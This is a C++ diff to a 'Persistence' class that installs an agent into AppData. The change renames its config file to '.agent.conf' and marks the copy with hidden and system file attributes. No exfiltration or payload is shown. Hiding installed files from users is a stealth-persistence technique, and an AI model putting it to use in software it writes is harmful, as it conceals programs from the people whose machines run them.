@@ -52,11 +52,15 @@ std::string Persistence::install_to_appdata(const Config& config) {
             auto src_size = fs::file_size(current);
             auto dst_size = fs::file_size(target);
             if (src_size == dst_size) {
-                // Still copy config in case it changed
-                std::string src_conf = fs::path(current).parent_path().string() + "\\agent.conf";
-                std::string dst_conf = install_dir + "\\agent.conf";
+                // Still copy config in case it changed (try hidden first, then legacy)
+                std::string parent = fs::path(current).parent_path().string();
+                std::string src_conf = parent + "\\.agent.conf";
+                if (!fs::exists(src_conf)) src_conf = parent + "\\agent.conf";
+                std::string dst_conf = install_dir + "\\.agent.conf";
                 if (fs::exists(src_conf)) {
                     fs::copy_file(src_conf, dst_conf, fs::copy_options::overwrite_existing);
+                    // Set hidden attribute on destination
+                    SetFileAttributesA(dst_conf.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                 }
                 return target;
             }
@@ -68,13 +72,16 @@ std::string Persistence::install_to_appdata(const Config& config) {
         return current; // fallback to current location
     }
 
-    // Also copy config file
+    // Also copy config file (hidden)
     try {
-        std::string src_conf = fs::path(current).parent_path().string() + "\\agent.conf";
-        std::string dst_conf = install_dir + "\\agent.conf";
+        std::string parent = fs::path(current).parent_path().string();
+        std::string src_conf = parent + "\\.agent.conf";
+        if (!fs::exists(src_conf)) src_conf = parent + "\\agent.conf";
+        std::string dst_conf = install_dir + "\\.agent.conf";
         if (fs::exists(src_conf)) {
             fs::copy_file(src_conf, dst_conf, fs::copy_options::overwrite_existing);
-            Logger::info("config copied to " + dst_conf);
+            SetFileAttributesA(dst_conf.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+            Logger::info("hidden config copied to " + dst_conf);
         }
     } catch (...) {}
 
@@ -132,10 +139,13 @@ void Persistence::verify_integrity() {
     std::string current_path = to_narrow(exe_path);
     std::string current_dir = fs::path(current_path).parent_path().string();
 
-    // Check config file exists
-    std::string conf_path = current_dir + "\\agent.conf";
+    // Check config file exists (hidden or legacy)
+    std::string conf_path = current_dir + "\\.agent.conf";
     if (!fs::exists(conf_path)) {
-        Logger::error("config file missing: " + conf_path);
+        conf_path = current_dir + "\\agent.conf";
+        if (!fs::exists(conf_path)) {
+            Logger::error("config file missing in " + current_dir);
+        }
     }
 
     if (!fs::exists(current_path)) {
